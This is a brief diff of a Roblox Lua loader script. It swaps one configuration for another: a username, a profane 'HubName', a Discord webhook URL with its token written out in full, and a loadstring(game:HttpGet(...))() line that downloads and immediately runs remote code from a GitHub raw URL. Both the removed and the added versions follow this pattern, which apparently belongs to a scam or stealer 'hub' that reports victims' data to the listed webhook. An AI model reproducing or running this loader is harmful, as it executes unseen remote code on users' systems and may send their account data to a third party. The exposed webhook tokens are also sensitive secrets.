@@ -1,3 +1,5 @@
-UserName = "Srelvn"
-Webhook = "https://discord.com/api/webhooks/1098167131004211292/jjKdlBEUOqaLWHR7eMc48Q6f1Slzp-jT_dLYYaLx3y9bO_PzufsUGV8HPYoW8qIoxX11"
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+_G.Username = "Srelvn"
+_G.HubName = "Dolandirirsan Sikerim"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098172415063892039/spQHTeEMUW1W9QxyCC8vMMs4QXw4kL1ko_tu29jVLlDGvY6S3upTt5d-HeQCaxjWLYWJ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
